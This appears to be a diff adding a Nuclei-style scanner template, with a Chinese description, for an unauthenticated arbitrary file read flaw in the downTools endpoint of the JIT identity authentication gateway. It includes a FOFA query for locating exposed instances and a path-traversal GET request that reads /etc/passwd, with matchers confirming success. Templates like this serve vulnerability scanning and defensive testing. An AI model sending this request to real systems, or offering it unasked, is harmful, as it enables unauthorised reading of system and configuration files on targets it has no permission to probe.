@@ -1,0 +1,33 @@
+id: jidazhengyuan-downTools-File-reading
+
+info:
+  tags: jidazhengyuan-downTools-File-reading
+  name: 吉大正元身份认证网关 downTools 任意文件读取漏洞
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="/jit_pnx_portal/" || header="server: jit_pnxcore1 web service" || title="吉大正元身份认证网关"
+    吉大正元身份认证网关 downTools 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+
+
+http:
+  - raw:
+      - |
+        GET /jit_pnx_portal/downTools?fileName=../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
+
+
